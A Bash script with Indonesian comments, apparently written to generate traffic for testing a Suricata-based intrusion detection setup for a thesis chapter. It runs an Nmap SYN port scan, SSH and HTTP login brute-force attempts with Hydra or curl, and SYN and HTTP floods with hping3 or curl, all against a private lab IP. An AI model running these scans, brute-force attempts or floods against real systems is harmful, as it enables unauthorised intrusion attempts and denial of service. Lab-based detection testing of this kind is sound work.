#!/usr/bin/env bash
# =============================================================================
#  attack_bab5.sh — Simulasi Serangan untuk Skripsi BAB V (SuricataEVE)
#  Skenario:
#  1. Port Scanning (menggunakan Nmap)
#  2. Brute Force (menggunakan Hydra atau Curl)
#  3. DDoS Simulation (menggunakan Hping3)
# =============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
BOLD='\033[1m'
NC='\033[0m'

TARGET_IP="192.168.216.128" # GANTI DENGAN IP TARGET ANDA
TARGET_PORT="80"
TARGET_URL="http://${TARGET_IP}:${TARGET_PORT}/login"

info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
attack()  { echo -e "${RED}[ATK]${NC}   $*"; }
header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════${NC}";
            echo -e "${BOLD}${BLUE}  $*${NC}";
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}\n"; }

# ── Check Dependencies ────────────────────────────────────────────────────────
check_cmd() {
    if ! command -v "$1" &> /dev/null; then
        warn "Tool '$1' tidak ditemukan. Menggunakan alternatif atau disarankan untuk install (sudo apt install $1)."
        return 1
    fi
    return 0
}

header "🔥 SURICATAEVE ATTACK SIMULATOR (BAB V)"
echo -e "  Target IP : ${BOLD}${TARGET_IP}${NC}"
echo ""
read -rp "$(echo -e ${YELLOW}[?]${NC}) Lanjut eksekusi? Pastikan IP Target sudah benar (y/N): " confirm
[[ "${confirm,,}" != "y" ]] && echo "Dibatalkan." && exit 0

# ── 1. PORT SCANNING ──────────────────────────────────────────────────────────
header "1. Skenario Pengujian: Port Scanning"
attack "Melakukan pemindaian port menggunakan Nmap..."
if check_cmd "nmap"; then
    nmap -sS -p 1-1000 -T4 "$TARGET_IP"
else
    attack "Alternatif Port Scan menggunakan bash..."
    for port in 21 22 80 443 3306; do
        timeout 1 bash -c "echo >/dev/tcp/$TARGET_IP/$port" 2>/dev/null && echo "Port $port is open" || echo "Port $port is closed"
    done
fi
info "Port Scanning Selesai. (Silakan screenshot untuk BAB V)"
sleep 3

# ── 2. BRUTE FORCE ────────────────────────────────────────────────────────────
header "2. Skenario Pengujian: Brute Force"
attack "Melakukan simulasi Brute Force Login..."
if check_cmd "hydra"; then
    attack "Menggunakan Hydra ke layanan SSH..."
    # Contoh hydra cepat dengan password yang salah
    hydra -l admin -p wrongpassword ssh://"$TARGET_IP" -t 4 -vV
else
    attack "Menggunakan Curl untuk Brute Force HTTP Basic Auth..."
    for i in {1..20}; do
        curl -s -u admin:salahpass$i "$TARGET_URL" > /dev/null
        echo -ne "Mencoba password: salahpass$i\r"
        sleep 0.2
    done
    echo ""
fi
info "Brute Force Selesai. (Silakan screenshot untuk BAB V)"
sleep 3

# ── 3. DDoS SIMULATION ────────────────────────────────────────────────────────
header "3. Skenario Pengujian: DDoS Simulation"
attack "Melakukan simulasi DDoS (SYN Flood / HTTP Flood)..."
if check_cmd "hping3"; then
    attack "Menggunakan Hping3 (Dibutuhkan akses sudo)..."
    sudo hping3 -S -p 80 --flood -c 10000 "$TARGET_IP"
else
    attack "Menggunakan Curl HTTP Flood (Background jobs)..."
    for i in {1..500}; do
        curl -s "$TARGET_URL" > /dev/null &
    done
    wait
    echo "500 Request dikirim secara bersamaan."
fi
info "DDoS Simulation Selesai. (Silakan screenshot untuk BAB V)"
echo ""

header "✅ SEMUA SKENARIO PENGUJIAN SELESAI"
echo -e "Silakan cek Dashboard SuricataEVE dan Log Firewall untuk melihat hasil deteksi dan blokir."
